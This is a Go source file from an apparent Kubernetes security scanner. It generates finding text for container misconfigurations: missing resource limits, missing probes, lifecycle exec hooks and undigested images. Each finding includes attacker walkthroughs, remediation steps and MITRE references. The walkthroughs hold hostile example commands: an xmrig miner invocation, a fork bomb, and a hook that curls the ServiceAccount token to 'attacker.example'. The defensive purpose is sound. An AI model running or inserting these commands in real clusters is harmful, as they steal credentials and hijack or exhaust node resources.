// Content for container-security findings. Each rule has a builder that takes runtime
// context (workload kind/namespace/name, container name, image, missing-field flags)
// and returns an enriched ruleContent with scope-aware language, an attacker
// walkthrough, ordered remediation steps, and structured references / MITRE technique
// citations.
//
// Sources: Kubernetes Resource Management for Pods and Containers, Kubernetes Probes
// docs, NSA/CISA Kubernetes Hardening Guide v1.2, CIS Kubernetes Benchmark v1.9, OWASP
// Kubernetes Top 10 (K05), MITRE ATT&CK Containers matrix, Sysdig "Best Practices for
// Container Image Security", Sigstore project (cosign / image signing), Aqua "Why you
// should never use the :latest tag", Tigera "Lifecycle hooks misuse".
package containersec

import (
	"fmt"

	"github.com/0hardik1/kubesplaining/internal/models"
)

// ruleContent bundles every enriched field a containersec rule emits.
type ruleContent struct {
	Title            string
	Scope            models.Scope
	Description      string
	Impact           string
	AttackScenario   []string
	Remediation      string
	RemediationSteps []string
	LearnMore        []models.Reference
	MitreTechniques  []models.MitreTechnique
}

// scopeForWorkload returns the per-workload scope so the report can show blast radius
// at a glance (DaemonSets affect every node, control-plane namespaces are sensitive).
func scopeForWorkload(kind, namespace, name string) models.Scope {
	detail := fmt.Sprintf("Workload `%s/%s/%s`", kind, namespace, name)
	if kind == "DaemonSet" {
		detail += ", runs on **every** node (per-node blast radius)"
	}
	return models.Scope{Level: models.ScopeWorkload, Detail: detail}
}

// MITRE technique objects shared across containersec rules.
var (
	mitreT1499 = models.MitreTechnique{ID: "T1499", Name: "Endpoint Denial of Service", URL: "https://attack.mitre.org/techniques/T1499/"}
	mitreT1496 = models.MitreTechnique{ID: "T1496", Name: "Resource Hijacking", URL: "https://attack.mitre.org/techniques/T1496/"}
	mitreT1611 = models.MitreTechnique{ID: "T1611", Name: "Escape to Host", URL: "https://attack.mitre.org/techniques/T1611/"}
	mitreT1525 = models.MitreTechnique{ID: "T1525", Name: "Implant Internal Image", URL: "https://attack.mitre.org/techniques/T1525/"}
	mitreT1195 = models.MitreTechnique{ID: "T1195.002", Name: "Compromise Software Supply Chain", URL: "https://attack.mitre.org/techniques/T1195/002/"}
	mitreT1059 = models.MitreTechnique{ID: "T1059", Name: "Command and Scripting Interpreter", URL: "https://attack.mitre.org/techniques/T1059/"}
	mitreT1554 = models.MitreTechnique{ID: "T1554", Name: "Compromise Host Software Binary", URL: "https://attack.mitre.org/techniques/T1554/"}
	mitreT1485 = models.MitreTechnique{ID: "T1485", Name: "Data Destruction", URL: "https://attack.mitre.org/techniques/T1485/"}
)

var (
	refResourceMgmt   = models.Reference{Title: "Kubernetes — Resource Management for Pods and Containers", URL: "https://kubernetes.io/docs/concepts/configuration/manage-resources-containers/"}
	refProbes         = models.Reference{Title: "Kubernetes — Configure Liveness, Readiness and Startup Probes", URL: "https://kubernetes.io/docs/tasks/configure-pod-container/configure-liveness-readiness-startup-probes/"}
	refLifecycleHooks = models.Reference{Title: "Kubernetes — Container Lifecycle Hooks", URL: "https://kubernetes.io/docs/concepts/containers/container-lifecycle-hooks/"}
	refImages         = models.Reference{Title: "Kubernetes — Images", URL: "https://kubernetes.io/docs/concepts/containers/images/"}
	refNSAHardening   = models.Reference{Title: "NSA/CISA Kubernetes Hardening Guide v1.2 (PDF)", URL: "https://media.defense.gov/2022/Aug/29/2003066362/-1/-1/0/CTR_KUBERNETES_HARDENING_GUIDANCE_1.2_20220829.PDF"}
	refLimitRange     = models.Reference{Title: "Kubernetes — LimitRange", URL: "https://kubernetes.io/docs/concepts/policy/limit-range/"}
	refResourceQuotas = models.Reference{Title: "Kubernetes — Resource Quotas", URL: "https://kubernetes.io/docs/concepts/policy/resource-quotas/"}
	refSigstoreCosign = models.Reference{Title: "Sigstore — cosign image signing & verification", URL: "https://docs.sigstore.dev/cosign/overview/"}
)

// missingPieces renders the human-readable list of missing resource fields ("memory
// limits", "CPU limits and CPU requests", etc.) for the title and description.
func missingPieces(missingCPULimit, missingMemLimit, missingCPUReq, missingMemReq bool) string {
	parts := []string{}
	if missingCPULimit {
		parts = append(parts, "CPU limits")
	}
	if missingMemLimit {
		parts = append(parts, "memory limits")
	}
	if missingCPUReq {
		parts = append(parts, "CPU requests")
	}
	if missingMemReq {
		parts = append(parts, "memory requests")
	}
	return joinHumanList(parts)
}

// joinHumanList stitches a string slice with Oxford-style commas: "A", "A and B",
// "A, B, and C". Used to keep the rule titles readable when several fields are missing
// at once.
func joinHumanList(parts []string) string {
	switch len(parts) {
	case 0:
		return ""
	case 1:
		return parts[0]
	case 2:
		return parts[0] + " and " + parts[1]
	default:
		out := ""
		for i, p := range parts {
			if i == len(parts)-1 {
				out += "and " + p
				continue
			}
			out += p + ", "
		}
		return out
	}
}

// contentLimits001 builds the prose for KUBE-CONTAINER-LIMITS-001: container template
// is missing one or more of CPU/memory limits/requests. The narrative explains the
// noisy-neighbor and node-pressure failure modes, not just "best practice".
func contentLimits001(kind, namespace, name, container string, missingCPULimit, missingMemLimit, missingCPUReq, missingMemReq bool) ruleContent {
	scope := scopeForWorkload(kind, namespace, name)
	missing := missingPieces(missingCPULimit, missingMemLimit, missingCPUReq, missingMemReq)
	return ruleContent{
		Title: fmt.Sprintf("Container `%s` in `%s/%s/%s` is missing %s", container, kind, namespace, name, missing),
		Scope: scope,
		Description: fmt.Sprintf("Container `%s` in workload `%s/%s/%s` does not declare %s. Without explicit resource limits and requests the kubelet cannot reason about the container's demand and cgroup limits are not set, so a runaway process can consume all available CPU on the node or be killed last by the OOM-killer rather than first.\n\n"+
			"This is also a Quality-of-Service classification issue. Kubernetes assigns a pod one of three QoS classes (`Guaranteed`, `Burstable`, `BestEffort`) based on which resource fields are populated, and that class drives the OOM-score adjustment and eviction order. A pod with no requests or limits at all lands in `BestEffort`, the class kubelet evicts first when the node runs out of memory, which is the opposite of what you want for a production workload.\n\n"+
			"Beyond stability, missing limits also enable cryptojacking and Denial-of-Service via container compromise: an attacker who lands code execution inside a `BestEffort` container can spawn `xmrig` and consume every spare CPU cycle on the node, starving co-tenants, or fork-bomb until the node OOMs and reschedules everything. ResourceQuota enforcement at the namespace level also requires every container to declare requests/limits.",
			container, kind, namespace, name, missing),
		Impact: "Container can starve co-tenants of CPU or RAM on the same node, lands in the first-to-evict QoS class, and blocks ResourceQuota enforcement. After a compromise it enables silent cryptojacking and node-level DoS.",
		AttackScenario: []string{
			fmt.Sprintf("Attacker gains code execution in container `%s` (RCE in the app, malicious dependency, SSRF→shell).", container),
			"They run `cat /sys/fs/cgroup/cpu.max` and see no limit, then `cat /sys/fs/cgroup/memory.max` and see `max`.",
			"They start a CPU miner: `xmrig -o pool.example:3333 -t $(nproc)` and immediately consume every core on the node.",
			"Co-tenant pods on the same node throttle and start failing liveness probes; the kubelet evicts other `BestEffort` workloads first.",
			"For a louder DoS: `:(){ :|:& };:` (a fork bomb) or `dd if=/dev/zero of=/dev/null bs=1M` until the node OOMs and reschedules everything. The container itself is the last to be killed because everyone else is `BestEffort` too.",
		},
		Remediation: fmt.Sprintf("Set explicit `resources.requests` and `resources.limits` on container `%s` so the pod reaches at least the `Burstable` QoS class.", container),
		RemediationSteps: []string{
			fmt.Sprintf("Profile actual usage: `kubectl top pod -n %s --containers` over a representative window, or use Vertical Pod Autoscaler in recommendation mode (`updateMode: Off`).", namespace),
			fmt.Sprintf("Declare both `requests` and `limits` for CPU and memory on container `%s`. As a rule of thumb start with `requests` at the p95 of observed usage and `limits` at 2× the requests.", container),
			"Add a namespace `LimitRange` with sensible defaults so future workloads inherit baseline values when authors forget.",
			"Add a `ResourceQuota` to the namespace so every pod must declare resources to be admitted; new BestEffort pods will be rejected.",
			"Enforce at admission with Kyverno (`require-pod-resources`) or OPA Gatekeeper (`K8sRequiredResources`) so the check runs in CI, not after an incident.",
		},
		LearnMore: []models.Reference{
			refResourceMgmt,
			refLimitRange,
			refResourceQuotas,
			refNSAHardening,
			{Title: "Sysdig — Kubernetes capacity planning: How to right-size requests and limits", URL: "https://sysdig.com/blog/kubernetes-capacity-planning/"},
		},
		MitreTechniques: []models.MitreTechnique{mitreT1499, mitreT1496},
	}
}

// contentProbe001 builds the prose for KUBE-CONTAINER-PROBE-001: container template
// is missing both liveness and readiness probes. The narrative covers the deadlock /
// black-hole failure modes that show up only under partial failures.
func contentProbe001(kind, namespace, name, container string) ruleContent {
	scope := scopeForWorkload(kind, namespace, name)
	return ruleContent{
		Title: fmt.Sprintf("Container `%s` in `%s/%s/%s` has neither a liveness nor a readiness probe", container, kind, namespace, name),
		Scope: scope,
		Description: fmt.Sprintf("Container `%s` in `%s/%s/%s` does not declare a `livenessProbe` or a `readinessProbe`. Without either, the kubelet has no way to detect that the container has wedged (deadlocked thread, stuck on a missing dependency, infinite GC loop) and the Service endpoint controller has no way to know when the container is actually ready to serve traffic.\n\n"+
			"The two probes solve different problems and are not interchangeable. A `readinessProbe` controls Service endpoint membership: a failing probe pulls the pod out of the load balancer so the next request hits a healthy replica. A `livenessProbe` controls restart: a failing probe asks the kubelet to kill and restart the container so a wedged process recovers without manual intervention. The Pod Lifecycle docs are explicit that container processes exited correctly but stuck in an infinite loop will appear healthy to Kubernetes forever without probes.\n\n"+
			"The operational symptom is a workload that looks Running in `kubectl get pod` but black-holes requests in production. Users see HTTP 502s through the Service, every metric on the pod stays at zero, and the kubelet never restarts it. Add to that the rolling-update problem: without a readiness probe, Deployments treat the pod as Ready the moment the container starts, so new traffic hits a backend that has not finished its warmup (database connection pool, cache hydration, model loading) and a small fraction of requests fail every rollout.",
			container, kind, namespace, name),
		Impact: "Wedged containers stay in the load balancer indefinitely (no readiness probe) and never restart (no liveness probe), causing partial outages that survive every reboot and rolling update.",
		AttackScenario: []string{
			fmt.Sprintf("A regression in the app deployed via `%s/%s` deadlocks one worker thread on a code path the unit tests do not cover.", kind, name),
			"The container process is alive (no crash), so the kubelet's default \"PID 1 alive\" check passes and no liveness probe contradicts it.",
			"The pod remains in the Service endpoint set because nothing tells the endpoint controller otherwise. The load balancer keeps routing a share of requests to the wedged replica.",
			"Users see 502s for one in N requests across the duration of the incident. SLO error budget burns at the rate of `1/replicas`.",
			"On-call rolls a restart manually after triage. The next rollout reproduces the same partial outage because the same probe gap is still in the template.",
		},
		Remediation: fmt.Sprintf("Add both a `livenessProbe` and a `readinessProbe` (HTTP, TCP, or exec) to container `%s` and tune `initialDelaySeconds` to cover startup.", container),
		RemediationSteps: []string{
			"Identify the app's startup time (cold-start, including dependency hydration) and steady-state failure modes (what does \"wedged\" look like?).",
			"Add a `readinessProbe` that returns 200 only when the app is ready to serve real traffic (DB pool open, cache warmed, model loaded). For most HTTP apps, an `/healthz` endpoint that checks downstream dependencies is correct.",
			"Add a `livenessProbe` that is *strictly* less specific than the readiness probe (e.g. a tiny `/livez` endpoint that just returns 200). A liveness probe that depends on the same DB the app uses will restart the pod every time the DB hiccups, amplifying outages.",
			"Set `initialDelaySeconds` larger than the worst-case cold start. Use a `startupProbe` instead if startup time has high variance, so the liveness probe has a separate timer.",
			"Enforce at admission with Kyverno (`require-pod-probes`) or OPA Gatekeeper so future workloads cannot ship without probes.",
		},
		LearnMore: []models.Reference{
			refProbes,
			refNSAHardening,
			{Title: "Kubernetes — Pod Lifecycle: Probes", URL: "https://kubernetes.io/docs/concepts/workloads/pods/pod-lifecycle/#container-probes"},
			{Title: "Google SRE — Liveness vs Readiness probes", URL: "https://cloud.google.com/blog/products/containers-kubernetes/kubernetes-best-practices-setting-up-health-checks-with-readiness-and-liveness-probes"},
		},
		MitreTechniques: []models.MitreTechnique{mitreT1499},
	}
}

// contentLifecycle001 builds the prose for KUBE-CONTAINER-LIFECYCLE-001: container
// declares a postStart or preStop exec hook that runs a non-trivial command. The
// narrative covers both the persistence primitive and the auditability gap.
func contentLifecycle001(kind, namespace, name, container, hook, command string) ruleContent {
	scope := scopeForWorkload(kind, namespace, name)
	return ruleContent{
		Title: fmt.Sprintf("Container `%s` in `%s/%s/%s` runs a `%s` lifecycle exec hook", container, kind, namespace, name, hook),
		Scope: scope,
		Description: fmt.Sprintf("Container `%s` in `%s/%s/%s` declares a `lifecycle.%s.exec` handler that invokes `%s`. Lifecycle exec hooks run inside the container at well-defined points (`postStart` immediately after the container is created, `preStop` immediately before termination) using the kubelet's exec stream, which means they execute as PID 1's effective user but completely outside the application's own observability and audit trail.\n\n"+
			"There are two distinct risk patterns. The first is *persistence and configuration drift*: an exec hook is the simplest way to mutate a container at runtime in a way that survives no Git review (the hook string lives in the PodSpec, but nothing forces it to be a small wrapper script). A common production smell is a `postStart` hook that fetches additional secrets, edits config files, or installs extra packages with `apt-get`; those mutations skip the image-signing pipeline, leave no audit-log entry, and frequently disable security controls the image build set up.\n\n"+
			"The second is *attack surface and detection bypass*. Lifecycle exec runs invisibly to most container EDR tooling: Falco's default rules treat exec-from-kubelet differently from in-container shell spawns, and many SIEM pipelines drop these events as \"infrastructure noise.\" An attacker who can mutate the PodSpec (compromised CI, modified Helm chart, exposed Argo CD) can add a `preStop` hook that exfiltrates secrets when the pod is terminated for any reason (rollout, eviction, node drain), giving them a stealthy persistent foothold tied to normal cluster operations.",
			container, kind, namespace, name, hook, command),
		Impact: "Lifecycle exec runs outside the application's observability surface and is frequently used to mutate container state at runtime, persist attacker-controlled changes, or exfiltrate secrets on graceful termination.",
		AttackScenario: []string{
			"Attacker gains write access to the PodSpec source (compromised CI runner, mis-scoped ArgoCD App, leaked Helm values).",
			fmt.Sprintf("They add or modify the `lifecycle.%s.exec.command` to `[\"sh\",\"-c\",\"curl -d @/var/run/secrets/kubernetes.io/serviceaccount/token https://attacker.example/x\"]`.", hook),
			"On the next rollout the new pods execute the hook; the existing pods execute the `preStop` variant when they are evicted during the rollout.",
			"The kubelet executes the command as the container's primary user. The application logs are empty (the app process never saw the request), and most container EDR rules ignore kubelet-exec.",
			"Attacker harvests the ServiceAccount token, the projected volume secrets, and any file the application user can read. The trail in the cluster audit log is one routine `update` to the Deployment.",
		},
		Remediation: fmt.Sprintf("Move the work performed by the `%s` hook into the image (build-time) or an init container; if the hook is genuinely required, make it a small auditable script under source control.", hook),
		RemediationSteps: []string{
			fmt.Sprintf("Audit what `%s` is doing. Common offenders: fetching secrets, editing config files, registering with a service mesh, warming a cache.", hook),
			"Move build-time mutations into the image build itself. Anything that hits the network at `postStart` belongs in a sidecar or an init container with explicit RBAC.",
			"If the hook is genuinely needed, replace inline `sh -c \"...\"` commands with a small shell script baked into the image (e.g. `/usr/local/bin/poststart.sh`) so reviewers see exactly one auditable file.",
			"Add Kyverno (`disallow-lifecycle-exec` or a tighter `validate` that bans `sh -c` inline) to keep regressions out.",
			"Wire Falco / runtime-EDR to alert on kubelet-driven exec into long-running pods; treat lifecycle exec the same as a manual `kubectl exec`.",
		},
		LearnMore: []models.Reference{
			refLifecycleHooks,
			refNSAHardening,
			{Title: "Falco — Detect kubectl exec / kubelet exec", URL: "https://falco.org/docs/rules/default-rules/"},
			{Title: "Tigera — Kubernetes lifecycle hooks: misuse and detection", URL: "https://www.tigera.io/blog/kubernetes-pod-security-policies-with-tigera-secure-1-3/"},
		},
		MitreTechniques: []models.MitreTechnique{mitreT1059, mitreT1554, mitreT1611},
	}
}

// contentImage001 builds the prose for KUBE-CONTAINER-IMAGE-001: container uses a
// mutable image reference (no digest) with `imagePullPolicy: Always` (or unset for
// :latest) so a registry-side substitution lands silently on the next pod start. This
// is intentionally scoped to digest-pinning (not :latest itself) so it does not
// duplicate KUBE-IMAGE-LATEST-001 in the podsec module.
func contentImage001(kind, namespace, name, container, image, pullPolicy string) ruleContent {
	scope := scopeForWorkload(kind, namespace, name)
	pullDesc := "`imagePullPolicy: Always` (or the default for mutable tags)"
	if pullPolicy != "" {
		pullDesc = fmt.Sprintf("`imagePullPolicy: %s`", pullPolicy)
	}
	return ruleContent{
		Title: fmt.Sprintf("Container `%s` in `%s/%s/%s` uses image `%s` without a digest pin", container, kind, namespace, name, image),
		Scope: scope,
		Description: fmt.Sprintf("Container `%s` in `%s/%s/%s` references image `%s` by mutable tag and uses %s. Mutable tags (`:latest`, `:v1`, `:stable`, any tag without an immutable `@sha256:` digest) resolve to whichever manifest the registry happens to point that tag at *right now*. With `imagePullPolicy: Always`, every new pod start pulls the registry's current resolution of the tag, so a registry-side substitution (compromised registry, supply-chain attack, accidental overwrite) lands silently on the next reschedule, eviction, autoscaling event, or node restart.\n\n"+
			"This is the classic Kubernetes image-supply-chain pitfall. Even when the build pipeline produces a deterministic artifact, the cluster sees only the tag, and a different team (or attacker) can repoint the tag without the original publisher's involvement. The right answer is to reference the image by its content-addressable digest (`registry.example/app@sha256:abc123...`): the digest is computed over the image manifest, so the cluster will refuse to pull anything that does not match that exact bytes-on-disk.\n\n"+
			"Digest pinning also unlocks the rest of the supply-chain security stack: image signatures (cosign), Sigstore-style attestations, Kyverno `verifyImages` policies, and SLSA provenance all key off the digest. Without it, signatures are advisory at best because the verifier and the runtime can disagree about which image is being checked.",
			container, kind, namespace, name, image, pullDesc),
		Impact: "A registry-side tag rewrite (compromise, supply-chain attack, accidental overwrite) silently replaces the running image on the next pod start: reschedule, eviction, autoscale, or node restart. Signatures and provenance are not enforceable without a digest.",
		AttackScenario: []string{
			fmt.Sprintf("Attacker gains write access to the registry hosting `%s` (compromised CI bot account, leaked registry token, third-party base-image takeover).", image),
			fmt.Sprintf("They build a malicious image with an embedded reverse shell or token-stealer and push it under the same tag, replacing the legitimate manifest at `%s`.", image),
			"They wait for any natural pod restart: HPA scale-up, node drain, eviction, rolling update. Because the cluster sees only the tag and the pull policy fetches it again, the next kubelet pull resolves to the attacker's manifest.",
			"Existing pods continue running the old image. The intrusion is invisible until enough pods cycle for the new one to dominate, or until the attacker triggers a rollout to accelerate adoption.",
			"Detection is hard: image hash in `kubectl describe pod` now matches the malicious manifest, but no SBOM or CI artifact ever showed this digest because it never existed at build time.",
		},
		Remediation: fmt.Sprintf("Pin `%s` to an immutable digest (`registry.example/app@sha256:...`) and reduce dependence on `imagePullPolicy: Always`; verify with Sigstore / cosign at admission time.", image),
		RemediationSteps: []string{
			fmt.Sprintf("Resolve the current digest: `crane digest %s` (or `docker buildx imagetools inspect %s` for OCI multi-arch). Pin it: `image: %s@sha256:<digest>`.", image, image, image),
			"Update the build pipeline to emit the digest as part of the build output and write the digest, not the tag, into the manifest before `kubectl apply`.",
			"Sign images with `cosign sign` and require signature verification at admission with a Kyverno `verifyImages` rule or Sigstore Policy Controller.",
			"Add a Kyverno cluster policy that disallows un-digested image references (`require-image-digest`).",
			"Periodically reconcile pinned digests via Renovate / Dependabot so security patches still land, but as deliberate PRs with provenance, not silent registry rewrites.",
		},
		LearnMore: []models.Reference{
			refImages,
			refSigstoreCosign,
			refNSAHardening,
			{Title: "Sysdig — Best practices for container image security", URL: "https://sysdig.com/learn-cloud-native/container-security/container-image-security/"},
			{Title: "Kyverno — verifyImages rule (Sigstore)", URL: "https://kyverno.io/docs/writing-policies/verify-images/sigstore/"},
		},
		MitreTechniques: []models.MitreTechnique{mitreT1525, mitreT1195, mitreT1554, mitreT1485},
	}
}
